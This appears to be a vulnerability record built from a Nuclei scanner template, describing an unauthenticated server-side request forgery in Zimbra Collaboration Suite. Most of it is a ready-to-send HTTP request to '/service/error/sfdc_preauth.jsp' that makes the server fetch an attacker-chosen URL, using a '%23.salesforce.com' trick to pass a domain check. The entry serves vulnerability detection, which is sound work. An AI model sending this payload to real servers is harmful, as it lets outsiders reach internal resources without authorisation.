# Vulnerability: Zimbra Collaboration Suite - Server-Side Request Forgery
**Classification:** CWE-99,CWE-918
**Source:** Nuclei Template (`zimbra-preauth-ssrf.yaml`)

## Description
Zimbra Collaboration Suite (ZCS) allows remote unauthenticated attackers to cause the product to include content returned by third-party servers and use it as its own code.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/ HTTP/1.1
Host: {{Hostname}}
Accept: */*
```

